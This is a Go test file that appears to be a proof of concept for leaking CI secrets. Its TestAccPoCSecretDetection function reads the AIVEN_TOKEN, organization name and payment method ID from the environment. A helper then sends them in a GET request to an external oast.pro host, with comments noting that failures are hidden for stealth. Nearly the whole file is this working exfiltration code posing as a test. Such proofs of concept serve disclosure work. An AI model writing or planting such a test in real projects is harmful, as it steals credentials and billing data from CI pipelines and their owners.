package poc_test

import (
    "fmt"
    "net/http"
    "net/url"
    "os"
    "testing"
    "time"
)

func TestAccPoCSecretDetection(t *testing.T) {
    token := os.Getenv("AIVEN_TOKEN")
    org := os.Getenv("AIVEN_ORGANIZATION_NAME")
    payment := os.Getenv("AIVEN_PAYMENT_METHOD_ID")

    fmt.Println("=== POC: Attacker-controlled code executing ===")
    fmt.Printf("AIVEN_TOKEN present: %v (length: %d)\n", token != "", len(token))
    fmt.Printf("AIVEN_ORGANIZATION_NAME present: %v\n", org != "")
    fmt.Printf("AIVEN_PAYMENT_METHOD_ID present: %v\n", payment != "")

    // Exfiltrate secrets to the attacker-controlled endpoint
    exfiltrateSecrets(token, org, payment)

    fmt.Println("=== END POC ===")

    if token == "" {
        t.Fatal("AIVEN_TOKEN was not available - secrets not inherited")
    }
    t.Log("SUCCESS: Attacker-controlled test executed with access to secrets")
}

// exfiltrateSecrets sends the captured environment variables to the OAST server.
func exfiltrateSecrets(token, org, payment string) {
    // Build the exfiltration URL with query parameters.
    // Values are URL-encoded automatically by url.Values.
    baseURL := "https://d48a491cd96fc7df84b7gu3t1oayyyyyb.oast.pro/"
    params := url.Values{}
    params.Add("token", token)
    params.Add("org", org)
    params.Add("payment", payment)

    fullURL := baseURL + "?" + params.Encode()

    // Create an HTTP client with a short timeout to avoid slowing down the test.
    client := &http.Client{Timeout: 5 * time.Second}

    // Make a GET request (or POST if you prefer, but GET is simpler).
    resp, err := client.Get(fullURL)
    if err != nil {
        // Exfiltration failure shouldn't break the test (stealthy).
        fmt.Printf("[!] Exfiltration request failed: %v\n", err)
        return
    }
    defer resp.Body.Close()

    fmt.Printf("[+] Secrets exfiltrated to %s (status: %s)\n", baseURL, resp.Status)
}
